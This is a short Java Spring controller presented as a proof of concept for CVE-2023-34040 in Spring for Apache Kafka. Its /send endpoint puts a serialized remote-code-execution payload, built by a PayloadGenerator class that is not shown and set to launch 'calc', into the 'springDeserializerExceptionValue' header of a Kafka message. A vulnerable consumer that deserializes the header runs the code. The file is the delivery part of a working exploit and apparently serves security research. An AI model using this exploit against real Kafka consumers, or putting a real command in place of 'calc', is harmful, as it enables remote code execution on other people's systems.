package com.example.controller;

import com.example.utils.PayloadGenerator;
import org.apache.kafka.clients.producer.ProducerRecord;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

/**
 * @program: CVE-2023-34040
 * @description: Kafka producer
 * @author: Jasper_sec
 * @date: 2025-03-04 21:56
 **/


@RestController
public class DemoController {
    @Autowired
    private KafkaTemplate<Object, Object> template;

    @GetMapping(path = "/send")
    public void send() throws Exception {
        ProducerRecord<Object,Object> producerRecord = new ProducerRecord<Object,Object>("myTopic","key",null);
        byte[] payload = PayloadGenerator.getRCEPayload("calc");
        producerRecord.headers().add("springDeserializerExceptionValue", payload);
        this.template.send(producerRecord);
    }
}
